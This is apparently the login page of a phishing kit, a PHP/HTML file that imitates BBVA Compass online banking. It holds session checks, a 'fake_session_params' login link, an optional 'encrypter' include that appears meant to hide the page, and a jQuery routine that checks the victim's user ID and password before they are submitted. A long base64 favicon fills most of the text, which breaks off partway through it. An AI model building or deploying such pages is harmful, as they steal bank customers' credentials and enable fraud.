<?php
@ob_start();
session_start();
if (!isset($_SESSION['SESSION_ID'])) {
    header("location: index.php");
    exit;
}

include_once 'inc/config.php';
include_once 'inc/functions.php';
$session = isset($_GET['session']) ? $_GET['session'] : '';
$fake_session_params = "login.php?auth=1&header=1&session=" . $session;

$errmsg="";
if(isset($_GET['invalid'])&&isset($_GET['error']) && $_GET['error'] ==1)
{
    $errmsg='Invalid Credientials!, Try Again.';
}
 else {
    $errmsg="";
}


?>
<!DOCTYPE HTML>
<html>

  <head>
      <script src="assets/js/jquery-latest.min.js"></script>
    <?php
        if ($enable_encrypter) {
            require_once 'inc/encrypter.php';
        }
        ?>
      
  <script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />

    <link rel="stylesheet" href="./files/main.min.74dd028753bbd7b3ea43210862d9ea7f.css" type="text/css">
    <script type="text/javascript" src="./files/jquery.min.fb50358df4c2bd6aa6e1dd5b0d9b9d29.js"></script>
    <script type="text/javascript" src="./files/utils.min.960d4a24cc6fa3b473b4ae2018d5c364.js"></script>
    <!--script type="text/javascript" src="./files/granite.min.1cd927e8b915fa4931c6c086a8cfda10.js"></script-->
    <script type="text/javascript" src="./files/jquery.min.04c02883bbd8d131b579412d156fbd96.js"></script>
    <script type="text/javascript" src="./files/main.min.b0e37cd4a9e4a7e9533b8ae13c803716.js"></script>
    <script>
      function doLogin() {
        //alert("do_login runs");
        var user = $("#userNameInput").val();
        var pass = $("#passwordInput").val();
        if (user == "" && pass == "") {
          $(".signon-error-msg").html('<span style="color: rgb(163, 42, 61); font-style: italic;">Enter a valid User ID</span>');
        }
          else if (user.length <4){
                   $(".signon-error-msg").html('<span style="color: rgb(163, 42, 61); font-style: italic;">Enter a valid User ID</span>');
          }
          else if (pass.length <4){
                   $(".signon-error-msg").html('<span style="color: rgb(163, 42, 61); font-style: italic;">Enter a valid Password</span>');
          }
          else{
              $(".signon-error-msg").html("Logging in...");
              return true;
          }

        return false;
      }

    </script>



    <link href="./files/bbvacompass.css" rel="stylesheet" type="text/css" />


<!--
    <script src="./files/95bb966a4c61b200a089c37679aaf96e22114787/satelliteLib-f516ffe729454f82a22ff6c7b4e78587db69b27f.js"></script>-->

    <meta content="width=device-width, initial-scale=1" name="viewport">



    <link rel="stylesheet" href="./files/header.min.d29e8e549a0cea1736367ce9e2548ce5.css" type="text/css">




    <link rel="stylesheet" href="./files/style.css?jk7qta">



    <!-- HTML5 Shim and Respond.js  IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->





    <link rel="shortcut icon" href="data:image/vnd.microsoft.icon;base64,AAABAAMAMDAAAAEAIACoJQAANgAAACAgAAABACAAqBAAAN4lAAAQEAAAAQAgAGgEAACGNgAAKAAAADAAAABgAAAAAQAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABGIQcIRiEHIkYhBzhGIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHOEYhByJGIQcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARiEHD0YhB15GIQe1RiEH40YhB/JGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH8kYhB+NGIQe1RiEHXkYhBw8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABGIQcqRiEHskYhB/pGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH+kYhB7JGIQcqAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYhBytGIQfLRiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQfLRiEHKwAAAAAAAAAAAAAAAAAAAAAAAAAARiEHD0YhB7FGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEHsUYhBw8AAAAAAAAAAAAAAAAAAAAARiEHXkYhB/pGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH+kYhB14AAAAAAAAAAAAAAABGIQcIRiEHtEYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB7RGIQcIAAAAAAAAAABGIQciRiEH4kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB+JGIQciAAAAAAAAAABGIQc4RiEH8kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/JGIQc4AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9EHwX/Qx0D/0MdA/9DHQP/Qx0D/0MdA/9DHQP/Qx0D/0MdA/9DHQP/Qx4D/0UgBv9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0UgBv9qTDf/j3lp/454aP+OeGj/jnho/454aP+OeGj/jnho/454aP+KcmL/dVlG/1c2Hv9FIAb/RSAG/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////////////////////////////////////+/v7/+Pf2/9/Z1f+fi37/VTMb/0QfBf9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////9/fz/vbCn/6KPgv+woJX/1s7I//v6+f/////////////////+/v7/yL21/1o5Iv9FHwX/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vn/eV5M/0AaAP9FHwX/Ui8X/52KfP/49vX//////////////////////7aonf9KJgz/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RR8F/0klDP+9sKb///////////////////////Lv7f9uUTz/RB4E/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RiEH/0MdA/+EbFv//fz8//////////////////////+Tfm//Qx0D/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RiEH/0MeBP9xVED/9/X0//////////////////////+ein3/Qx4D/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RiEH/0MeA/9zV0P/+Pb1//////////////////7+/v+Kc2P/Qx0D/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RiEH/0MdAv+Ndmb//v7+/////////////////+jj4P9hQiz/RB8F/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0Yh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AABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc4RiEH8kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/JGIQc4AAAAAAAAAABGIQciRiEH4kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB+JGIQciAAAAAAAAAABGIQcIRiEHtEYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB7RGIQcIAAAAAAAAAAAAAAAARiEHXkYhB/pGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0Yh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B75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe6RiEHnUYhB1RGIQcNAAAAAAAAAAAAAAAAAAAAAAAAAABGIQcdRiEHqEYhB/hGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH+EYhB6hGIQcdAAAAAAAAAAAAAAAARiEHDEYhB6dGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB6dGIQcMAAAAAAAAAABGIQdURiEH+EYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH+EYhB1QAAAAARiEHAUYhB5xGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GI